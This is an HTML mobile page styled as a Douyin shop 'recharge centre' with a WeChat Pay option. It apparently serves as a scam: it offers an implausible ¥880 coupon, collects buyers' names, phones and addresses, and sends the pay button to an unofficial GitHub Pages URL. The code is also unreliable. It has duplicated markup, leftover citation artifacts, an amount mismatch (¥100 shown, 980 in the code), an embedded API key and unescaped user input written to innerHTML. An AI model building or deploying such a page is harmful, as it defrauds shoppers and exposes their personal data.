<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>抖音小店</title>
<meta name="keywords" content="这里填写关键词" />
<meta name="description" content="这里填写说明内容" />

<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>抖音充值中心</title>
    <style>
        /* 全局样式初始化‌:ml-citation{ref="1,3" data="citationList"} */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: "PingFang SC", sans-serif;
        }

        /* 容器布局 */
        .container {
            padding: 15px;
            max-width: 500px;
            margin: 0 auto;
        }

        /* 返回按钮‌:ml-citation{ref="7" data="citationList"} */
        .back-btn {
            position: fixed;
            right: 15px;
            top: 15px;
            color: #fff;
            text-decoration: none;
            z-index: 999;
        }
.container {
  position: relative;  /* 创建定位参考系‌:ml-citation{ref="1" data="citationList"} */
  min-height: 100vh;   /* 确保容器高度 */
}

.back-btn {
  position: absolute;  /* 启用绝对定位‌:ml-citation{ref="1,4" data="citationList"} */
  top: 15px;           /* 距顶部间距 */
  left: 15px;          /* 距左侧间距 */
  padding: 8px 12px;   /* 按钮内边距 */
  font-size: 14px;     /* 适配移动端显示‌:ml-citation{ref="2" data="citationList"} */
}

        /* 输入区域‌:ml-citation{ref="5" data="citationList"} */
        .input-section {
            background: #2a2a2a;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            background: #333;
            border: 1px solid #444;
            border-radius: 8px;
            color: #fff;
            margin-bottom: 10px;
        }
        /* 输入区域‌:ml-citation{ref="5" data="citationList"} */
        .input-section {
            background: #2a2a2a;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            background: #333;
            border: 1px solid #444;
            border-radius: 8px;
            color: #fff;
            margin-bottom: 10px;
        }

        /* 商品展示区‌:ml-citation{ref="3,4" data="citationList"} */
        .product-card {
            background: linear-gradient(135deg, #ff3366, #ff6666);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            position: relative;
            overflow: hidden;
        }
        .product-bg {
            position: absolute;
            right: -30px;
            top: -30px;
            width: 120px;
            height: 120px;
            background: rgba(255,255,255,0.1);
            border-radius: 50%;
        }


   /* 新增优惠券专属样式 */
.coupon-section {
    background: #2a2a2a;
    border-radius: 12px;
    padding: 15px 0;
    margin-bottom: 15px;
}

.coupon-header {
    padding: 0 15px 10px;
    border-bottom: 1px solid #3a3a3a;
    margin-bottom: 12px;
}

.coupon-item {
    position: relative;
    margin: 10px 15px;
    padding: 15px;
    background: linear-gradient(135deg, #333 0%, #3a3a3a 100%);
    border-radius: 10px;
    border: 2px solid #444;
    transition: all 0.3s ease;
}

.coupon-item:before {
    content: "";
    position: absolute;
    right: -1px;
    top: 50%;
    transform: translateY(-50%);
    width: 30px;
    height: 30px;
    background: #2a2a2a;
    clip-path: circle(50% at 100% 50%);
}

.coupon-item.active {
    border-color: #ff3366;
    background: linear-gradient(135deg, rgba(255,51,102,0.2) 0%, rgba(255,102,102,0.1) 100%);
    transform: translateX(5px);
}

.coupon-badge {
    position: absolute;
    right: -8px;
    top: -8px;
    background: #ff3366;
    color: white;
    padding: 4px 8px;
    border-radius: 12px;
    font-size: 12px;
    transform: rotate(15deg);
}

.coupon-value {
    color: #ff3366;
    font-size: 18px;
    font-weight: bold;
    margin-bottom: 5px;
}

.coupon-condition {
    color: #999;
    font-size: 12px;
}

.coupon-disabled {
    opacity: 0.5;
    filter: grayscale(0.8);
}

       /* 新增支付方式专属样式 */
.payment-section {
    background: #2a2a2a;
    border-radius: 12px;
    padding: 15px 0; /* 调整内边距 */
    margin-bottom: 15px;
}

.payment-header {
    padding: 0 15px 10px;
    border-bottom: 1px solid #3a3a3a; /* 添加分割线 */
    margin-bottom: 12px;
}

.payment-method {
    display: flex;
    align-items: center;
    padding: 15px;
    margin: 8px 15px;
    background: #333;
    border-radius: 10px;
    border: 2px solid transparent;
    transition: all 0.3s ease; /* 添加过渡动画 */
}

.payment-method:hover {
    background: #3a3a3a;
    box-shadow: 0 2px 8px rgba(0,0,0,0.2); /* 悬停效果 */
}

.payment-method.active {
    border-color: #ff3366; /* 选中状态高亮 */
    background: rgba(255,51,102,0.1);
}

.payment-icon {
    width: 32px;
    height: 32px;
    margin-right: 15px;
}

.payment-info {
    flex: 1;
}

.payment-title {
    font-weight: 500;
    margin-bottom: 4px;
}

.payment-desc {
    color: #999;
    font-size: 12px;
}


/* 新增金额展示样式 */
.amount-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 15px;
  margin-bottom: 15px;
  background: #333;
  border-radius: 8px;
}

.amount-title {
  color: #fff;
  font-size: 16px;
}

.amount-value {
  color: #ff3366;
  font-size: 20px;
  font-weight: bold;
}

.payment-title {
  color: #999;
  font-size: 14px;
  margin-bottom: 12px;
  padding-left: 5px;
}


/* 隐藏原生radio样式 */
.payment-radio {
    position: absolute;
    opacity: 0;
    height: 0;
    width: 0;
}

/* 自定义选中指示器 */
.checkmark {
    width: 20px;
    height: 20px;
    border: 2px solid #666;
    border-radius: 50%;
    position: relative;
}

.checkmark::after {
    content: "";
    position: absolute;
    display: none;
    left: 50%;
    top: 50%;
    transform: translate(-50%,-50%);
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #ff3366;
}

.payment-radio:checked ~ .checkmark::after {
    display: block;
}

        /* 提交按钮‌:ml-citation{ref="3,6" data="citationList"} */
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #FF5151;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
        }
 /* 样式可根据需要调整 */
        .cod-prompt {
            display: none;
            margin-top: 20px;
            background-color: #f9f9f9;
            padding: 15px;
            border: 1px solid #ccc;
        }
.cod-prompt {
    display: none;
    margin-top: 20px;
    background-color: #2a2a2a;
    padding: 20px;
    border: 1px solid #ccc;
    border-radius: 10px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.prompt-content {
    margin-bottom: 15px;
}

.prompt-buttons {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.cancel-btn, .confirm-btn {
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.cancel-btn {
    background-color: #f0f0f0;
    color: #666;
}

.cancel-btn:hover {
    background-color: #d0d0d0;
}

.confirm-btn {
    background-color: #ff3366;
    color: #fff;
}

.confirm-btn:hover {
    background-color: #0056b3;
}

.address-section {
        background: #2a2a2a;
        border-radius: 12px;
        padding: 15px;
        margin-bottom: 15px;
    }

    .address-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        cursor: pointer;
    }

    .add-icon {
        font-size: 24px;
        width: 40px;
        height: 40px;
        border-radius: 50%;
        background: #ff3366;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .address-form {
        display: none;
        background: #333;
        padding: 15px;
        border-radius: 12px;
        margin-top: 10px;
    }

    .address-form.active {
        display: block;
    }

    .address-display {
        margin-top: 10px;
        padding: 10px;
        background: #3a3a3a;
        border-radius: 8px;
    }

    select.input-field {
        appearance: none;
        background: url('data:image/svg+xml;utf8,<svg fill="%23fff" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat right 10px center/15px auto;
    }
.address-form {
    display: none;
    background: #333;
    padding: 15px;
    border-radius: 12px;
    margin-top: 10px;
}

.address-form.active {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
    gap: 10px;
}

.form-group {
    position: relative;
    min-width: 150px;
}

select.input-field {
    width: 100%;
    height: 44px;
    padding: 0 35px 0 15px;
    background-position: right 12px center;
}

/* 移动端适配 */
@media (max-width: 480px) {
    .address-form.active {
        grid-template-columns: 1fr;
    }
    
    .form-group {
        margin-bottom: 8px;
    }
}

/* 详细信息部分 */
.detail-fields {
    grid-column: 1 / -1;
}

.detail-fields .input-field {
    margin-bottom: 12px;
}
/* 下拉菜单优化 */
select.input-field {
    background-color: #404040 !important;
    border-color: #666 !important;
    color: #fff;
}

/* 下拉选项样式 */
select.input-field option {
    background: #505050;
    padding: 10px;
}

/* 鼠标悬停效果 */
select.input-field option:hover {
    background: #ff3366;
}

/* 选中状态 */
select.input-field option:checked {
    background: #ff3366;
    color: #fff;
}

/* 聚焦状态 */
select.input-field:focus {
    box-shadow: 0 0 0 2px rgba(255,51,102,0.3);
}
/* 添加行容器样式 */
.row {
    display: flex;
    gap: 10px;
    margin-bottom: 12px;
}

/* 移动端适配 */
@media (max-width: 480px) {
    .row {
        flex-direction: column;
        gap: 12px;
    }
}

/* 调整输入框宽度 */
#name, #phone {
    flex: 1;
    margin-bottom: 0; /* 移除原有底部间距 */
}
/* 悬浮支付按钮样式 */
.float-pay-btn {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    background: #ff3366;
    color: white;
    padding: 18px 120px;
    border-radius: 30px;
    font-size: 16px;
    font-weight: bold;
    box-shadow: 0 8px 20px rgba(255,51,102,0.3);
    cursor: pointer;
    z-index: 1000;
    transition: all 0.3s ease;
    white-space: nowrap;
}

.float-pay-btn:hover {
    background: #ff1a53;
    transform: translateX(-50%) scale(1.05);
}

@media (max-width: 480px) {
    .float-pay-btn {
        width: 90%;
        text-align: center;
        padding: 18px 20px;
        bottom: 20px;
    }
}
</style>


</head>


<body>
   
 <div class="container">
    <!-- 收货地址展示区域 -->
    <div class="address-section">
        <div class="address-header" onclick="toggleAddressForm()">
            <h3>收货地址</h3>
            <div class="add-icon">+</div>
        </div>
        <div class="address-display" id="addressDisplay"></div>
    </div>

<!-- 修改后的地址表单结构 -->
<div class="address-form" id="addressForm">
    <div class="form-group">
        <select class="input-field" id="province" onchange="loadRegion('city', this.value)">
            <option value="">选择省份</option>
        </select>
    </div>
    
    <div class="form-group">
        <select class="input-field" id="city" onchange="loadRegion('district', this.value)" style="display:none;">
            <option value="">选择城市</option>
        </select>
    </div>
    
    <div class="form-group">
        <select class="input-field" id="district" onchange="loadRegion('town', this.value)" style="display:none;">
            <option value="">选择区县</option>
        </select>
    </div>
    
    <div class="form-group">
        <select class="input-field" id="town" style="display:none;">
            <option value="">选择乡镇</option>
        </select>
    </div>

<div class="detail-fields">
    <input type="text" class="input-field" id="detail" placeholder="详细地址（如街道门牌号）">

    <div class="row"> <!-- 新增行容器 -->
        <input type="text" class="input-field" id="name" placeholder="收货人姓名">
        <input type="tel" class="input-field" id="phone" placeholder="联系电话">
    </div>
</div>
    
    <button class="submit-btn" onclick="saveAddress()" style="grid-column: 1 / -1">保存地址</button>
</div>


   <!-- 修改后的优惠券区块 -->
<div class="coupon-section">
    <div class="coupon-header">
        <h4>可用优惠券</h4>
        <small>1张未使用</small>
    </div>

    <div class="coupon-item active">
        <div class="coupon-badge">首充专属</div>
        <div class="coupon-value">¥880</div>
        <div class="coupon-condition">满900元可用</div>
        <div class="coupon-time">有效期至2025-03-31</div>
    </div>

</div>
       <!-- 修改后的支付方式区块 -->
<div class="payment-section">
    <div class="payment-header">
<div class="payment-section">
  <!-- 新增金额展示模块 -->
<!-- 新增金额展示模块 -->
<div class="amount-header">
    <div class="amount-title">需付金额</div>
    <div class="amount-value">¥100.00</div>
</div>

  <h4>选择支付方式</h4>
        </div>

        <!-- 微信支付模块 -->
      <label class="payment-method">
    <input type="radio" name="payment" class="payment-radio" checked onchange="togglePaymentButton()">
            <img src="https://lf6-infras.bytetos.com/obj/static-assets/859c771f7337d1fd7b15b5448118b191.png" class="payment-icon">
            <div class="payment-info">
                <div class="payment-title">微信支付</div>
                <div class="payment-desc">推荐微信用户使用</div>
            </div>
            <span class="checkmark"></span>
        </label>


<div class="float-pay-btn" onclick="handlePayment()">
    立即支付
</div>

       <!-- 修改后的支付方式区块 -->
<div class="payment-section">




 
    <div class="amount-value"></div>
</div>

        </div>

 

<script>
    // 高德地图API配置
    const AMapKey = '9d7c1a0273e7ddf37b9bf96b000e5b42';

    // 显示/隐藏地址表单
    function toggleAddressForm() {
        document.getElementById('addressForm').classList.toggle('active');
    }

    // 加载行政区划数据
    async function loadRegion(targetId, adcode) {
        const levelMap = {
            'city': 2,
            'district': 3,
            'town': 4
        };

        const response = await fetch(`https://restapi.amap.com/v3/config/district?keywords=${adcode}&subdistrict=${levelMap[targetId]}&key=${AMapKey}`);
        const data = await response.json();
        
        const target = document.getElementById(targetId);
        target.innerHTML = '<option value="">请选择</option>';
        
        if(data.districts[0]?.districts) {
            data.districts[0].districts.forEach(item => {
                const option = document.createElement('option');
                option.value = item.adcode;
                option.textContent = item.name;
                target.appendChild(option);
            });
            target.style.display = 'block';
        } else {
            target.style.display = 'none';
        }
    }

    // 保存地址
    function saveAddress() {
        const address = {
            province: document.getElementById('province').value,
            city: document.getElementById('city').value,
            district: document.getElementById('district').value,
            town: document.getElementById('town').value,
            name: document.getElementById('name').value,
            phone: document.getElementById('phone').value,
            detail: document.getElementById('detail').value
        };

        // 简单验证
        if (!address.name || !address.phone || !address.detail) {
            alert('请填写完整信息');
            return;
        }

        // 显示简化地址
        const displayText = [
            document.getElementById('province').selectedOptions[0]?.text,
            document.getElementById('city').selectedOptions[0]?.text,
            document.getElementById('district').selectedOptions[0]?.text,
            document.getElementById('town').selectedOptions[0]?.text,
            address.detail
        ].filter(Boolean).join(' ');

        document.getElementById('addressDisplay').innerHTML = `
            <p>${address.name} ${address.phone}</p>
            <p>${displayText}</p>
            <button class="submit-btn" onclick="toggleAddressForm()">修改地址</button>
        `;

        toggleAddressForm();
    }

    // 初始化加载省份
    window.onload = async () => {
        const response = await fetch(`https://restapi.amap.com/v3/config/district?keywords=100000&subdistrict=1&key=${AMapKey}`);
        const data = await response.json();
        const provinceSelect = document.getElementById('province');
        
        data.districts[0].districts.forEach(province => {
            const option = document.createElement('option');
            option.value = province.adcode;
            option.textContent = province.name;
            provinceSelect.appendChild(option);
        });
    };
</script>
<script>
function handlePayment() {
    // 获取支付相关信息
    const address = document.getElementById('addressDisplay').innerText;
    const paymentMethod = document.querySelector('input[name="payment"]:checked').value;

    // 强化验证逻辑
    if (!address || address.includes("请填写")) {
        alert('请先填写完整的收货地址');
        return;
    }

    // 验证手机号格式
    const phone = document.getElementById('phone').value;
    if (!/^1[3-9]\d{9}$/.test(phone)) {
        alert('请输入有效的手机号码');
        return;
    }

    // 支付金额（示例金额，可根据实际需求修改）
    const amount = 980;
    
    // 新窗口跳转支付
    const paymentWindow = window.open('', '_blank'); // 先打开空窗口防止被拦截
    
    // 构建支付参数（示例参数）
    const paymentUrl = new URL('https://pyqfk.github.io/556/fk100.html');

    
    // 设置新窗口地址
    paymentWindow.location.href = paymentUrl.toString();

    // 支付状态监听（示例）
    const checkPayment = setInterval(() => {
        if (paymentWindow.closed) {
            clearInterval(checkPayment);
            alert('支付已取消');
        }
        // 这里可以添加实际的支付状态查询逻辑
    }, 1000);
}
</script>
</body>
</html>
